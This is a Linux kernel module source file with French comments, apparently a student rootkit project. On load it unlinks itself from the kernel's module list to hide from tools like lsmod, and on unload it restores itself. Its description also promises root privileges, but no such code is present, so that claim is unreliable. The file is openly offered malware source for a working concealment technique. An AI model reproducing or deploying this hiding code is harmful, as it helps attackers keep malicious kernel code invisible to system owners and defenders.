#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

//Obliger d'avoir une license GPL car le kernel demande le moins de modules propriétaires possible
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ecole 2600 Groupe 6");
MODULE_DESCRIPTION("Module permettant de masquer un LKM et d'octroyer les privilèges root.");
MODULE_VERSION("0.1");

void showme(void);
void hideme(void);

// list_head -> double liste chainé utilisé par le kernel
// ca prends un .prev et .next mais on peut utiliser list_del() et list_add() pour ajouter/enlever des items de la struct list_head
// on doit juste garder une copie locale de l'item qu'on enlève au debut pour pouvoir le rajouter a la fin quand on a fini
static struct list_head *prev_module;
// 0 = visible, 1 = hidden
static short hidden = 0;

void showme(void)
{
    // on ajoute le module dans la liste des modules
    list_add(&THIS_MODULE->list, prev_module);
    //on set hidden a 0 pour dire que le module est visible
    hidden = 0;
}

void hideme(void)
{
    // on garde une copie du pointeur vers le module précédent (pour pouvoir le retrouver et le remettre a la bonne position quand on voudra le rajouter dans la liste)
    prev_module = THIS_MODULE->list.prev;
    // on supp le module de la liste des modules
    list_del(&THIS_MODULE->list);
    // on set hidden a 1 pour dire que le module est caché
    hidden = 1; 
}

// fonction éxécuté quand on charge le module dans le noyau
// __init ->  utilisé qu'à l'initialisation et que le code sera libéré après cette phase pour économiser de la mémoire
static int __init rootkit_init(void)
{
    hideme();
    return 0;
}

// fonction éxécuté quand on décharge le module du noyau
static void __exit rootkit_exit(void)
{
    showme();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
